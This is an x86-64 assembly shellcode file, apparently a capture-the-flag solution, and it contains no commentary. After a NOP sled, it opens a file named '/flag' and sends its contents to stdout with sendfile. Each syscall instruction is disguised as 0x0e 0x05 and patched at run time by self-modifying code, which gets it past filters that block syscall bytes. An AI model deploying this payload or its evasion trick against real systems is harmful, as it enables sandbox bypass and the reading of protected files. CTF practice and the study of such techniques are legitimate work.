.intel_syntax noprefix
.global _start
_start:
	.rept 4096
	nop
	.endr
	mov rbx,0x00000067616c662f
	
	push rbx
	mov rax,2
	mov rdi,rsp
	mov rsi,0
    inc byte ptr[rip]
    .byte 0x0e
    .byte 0x05

	mov rdi,1
	mov rsi,rax
	mov rdx,0
	mov r10,1000
	mov rax,40
	inc byte ptr[rip]
    .byte 0x0e
    .byte 0x05

	mov rax,60
    inc byte ptr[rip]
    .byte 0x0e
    .byte 0x05
